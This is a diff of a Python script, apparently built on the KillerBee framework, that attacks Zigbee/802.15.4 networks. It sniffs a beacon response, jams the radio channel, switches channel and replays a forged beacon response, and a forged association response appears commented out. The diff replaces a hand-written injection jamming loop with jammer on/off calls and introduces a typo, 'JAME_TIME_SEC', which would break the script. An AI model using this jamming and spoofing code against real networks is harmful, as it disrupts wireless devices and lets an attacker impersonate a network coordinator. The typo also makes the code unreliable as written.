@@ -69,7 +69,7 @@ if __name__ == '__main__':
                         beacon_response_bytes = bytearray(packet['bytes'])
                         got_beacon_response = True
                     else:
-                        print('  Ignoring packet: not beacon response.')
+                        print('  Ignoring packet: not beacon response or orphan notification.')
                     tries -= 1
                     if tries == 0:
                         print('  Failed to receive beacon response after ' + \
@@ -97,14 +97,10 @@ if __name__ == '__main__':
         kb.sniffer_off()
 
         # Jam for 0.4 sec
-        # TODO: Is this method sufficient for jamming?
         print('4. Jamming channel for ' + str(JAM_TIME_SEC) + ' seconds.')
-        time_start_sec = time.time();
-        elapsed = 0
-        while elapsed < JAM_TIME_SEC:
-            kb.inject(JAM_PKT_BYTES, None, 100, 0)
-            elapsed = time.time() - time_start_sec
-            print(str(100*round(min(1,elapsed/JAM_TIME_SEC), 2)) + '%')
+        kb.jammer_on()
+        time.sleep(JAME_TIME_SEC)
+        kb.jammer_off()
 
         # Increment channel
         # TODO: Are channel scans incremental from 11 to 26?
@@ -129,7 +125,7 @@ if __name__ == '__main__':
 
         # Send forged beacon response
         print('7. Replaying beacon response.')
-        kb.inject(beacon_response_bytes, args.channel, 1, 0)
+        kb.inject(beacon_response_bytes)
 
         # Wait for association request
         print('8. Listening for association request.')
@@ -150,7 +146,7 @@ if __name__ == '__main__':
         # TODO: This is complicated
 
         # Send forged association response
-        #kb.inject(assoc_response_pkt_bytes, args.channel, 1, 0)
+        #kb.inject(assoc_response_pkt_bytes)
 
     except KeyboardInterrupt:
         print 'Shutting down'
